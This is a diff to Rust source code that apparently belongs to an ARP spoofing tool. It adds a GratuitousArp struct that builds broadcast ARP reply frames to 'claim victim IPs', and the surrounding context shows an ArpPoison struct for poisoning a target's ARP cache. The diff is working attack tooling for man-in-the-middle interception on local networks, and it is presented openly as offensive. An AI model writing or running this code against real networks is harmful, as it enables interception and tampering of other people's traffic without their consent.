@@ -74,6 +74,34 @@ impl ArpRequest {
     }
 }
 
+/// Gratuitous ARP: announces "I own this IP" to all neighbors.
+/// Used to claim victim IPs without periodic gateway poisoning.
+pub struct GratuitousArp {
+    pub claimed_ip: Ipv4Addr,
+    pub our_mac: MacAddr,
+}
+
+impl GratuitousArp {
+    pub fn new(claimed_ip: Ipv4Addr, our_mac: MacAddr) -> Self {
+        Self {
+            claimed_ip,
+            our_mac,
+        }
+    }
+
+    pub fn to_bytes(&self) -> [u8; 42] {
+        build_arp_frame(
+            MacAddr::broadcast(),
+            self.our_mac,
+            ArpOperations::Reply,
+            self.our_mac,
+            self.claimed_ip,
+            MacAddr::zero(), // Gratuitous: target is unspecified
+            self.claimed_ip, // Gratuitous: target IP = sender IP
+        )
+    }
+}
+
 /// Unicast ARP reply used to poison a target's cache.
 /// Claims that `spoofed_ip` lives at `our_mac`.
 pub struct ArpPoison {
